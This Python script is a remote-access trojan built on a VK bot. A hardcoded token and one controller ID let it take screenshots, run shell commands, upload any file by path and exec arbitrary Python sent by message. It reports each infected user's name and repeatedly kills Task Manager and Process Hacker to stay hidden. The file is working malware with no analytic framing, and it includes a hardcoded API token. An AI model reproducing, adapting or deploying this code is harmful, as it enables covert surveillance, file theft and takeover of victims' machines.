from vkbottle.bot import Bot, Message
from vkbottle import API, PhotoMessageUploader, LoopWrapper, DocMessagesUploader
import asyncio, getpass, os
lw = LoopWrapper()
bot = Bot("3513a0158b87ebf2a29d71f518ded90c22941c92c627391f5546af721161980d2794200299b28c12efbdc")

@bot.on.private_message(text='screen')
async def priv(message: Message):
    if message.from_id == 690634508:
        try:
            import pyautogui
            photo = PhotoMessageUploader(bot.api)
            pyautogui.screenshot('screen.jpg')
            photo_upd = await photo.upload('screen.jpg')
            await message.answer(attachment=photo_upd)
        except Exception as Er:
            await message.answer(str(Er))

@bot.on.private_message(text="-p<command>")
async def priv(message: Message, command):
    if message.from_id == 690634508:
        try:
            popen = (os.popen(command))
            lines = popen.readlines()
            b = ""
            for g in lines:
                b = b + g
            await message.answer(b)
        except Exception as Er:
            await message.answer(Er)

@bot.on.private_message(text="-getfilecom <command>")
async def priv(message: Message, command):
    if message.from_id == 690634508:
        try:
            path = os.getcwd()
            popen = (os.popen(command))
            lines = popen.readlines()
            b = ""
            for g in lines:
                b = b + g
            fullpath = path + "/commandlog.txt"
            with open(fullpath, 'w') as f:
                f.write(b)
            docupd = DocMessagesUploader(bot.api)
            mydoc = await docupd.upload('commandlog.txt', fullpath, peer_id=message.peer_id)
            await message.answer('Command file', attachment=mydoc)
        except Exception as Er:
            await message.answer(Er)

@bot.on.private_message(text="-read <path>")
async def priv(message: Message, path):
    if message.from_id == 690634508:
        try:
            b = ""
            docupd = DocMessagesUploader(bot.api)
            mydoc = await docupd.upload('test.txt', path, peer_id=message.peer_id)
            await message.answer('Completed', attachment=mydoc)
        except Exception as Er:
            await message.answer(Er)

@bot.on.private_message(text="-th")
async def priv(message: Message):
    if message.from_id == 690634508:
        try:
            cwd = os.getcwd()
            await message.answer(cwd)
        except Exception as Er:
            await message.answer(Er)

@bot.on.private_message()
async def priv(message: Message):
    if message.from_id == 690634508:
        try:
            msg = message.text
            msg = msg.replace(r"\n", "\n")
            exec(message.text)
        except Exception as Er:
            await message.answer(str(Er))

@lw.timer(seconds=1)
async def delayed_task():
    api = API("3513a0158b87ebf2a29d71f518ded90c22941c92c627391f5546af721161980d2794200299b28c12efbdc")
    await api.messages.send(peer_id=690634508, message=(((getpass.getuser()).replace("PC", "")) + " was connected"), random_id=0)
    while True:
        try:
            os.system('taskkill /f /im ProcessHacker.exe')
            os.system('taskkill /f /im Taskmgr.exe')
            try:
                os.system("clear")
            except Exception as Er:
                os.system('cls')
            await asyncio.sleep(0.4)
        except Exception as Er:
            await asyncio.sleep(0.2)


bot.loop_wrapper = lw
bot.run_forever()
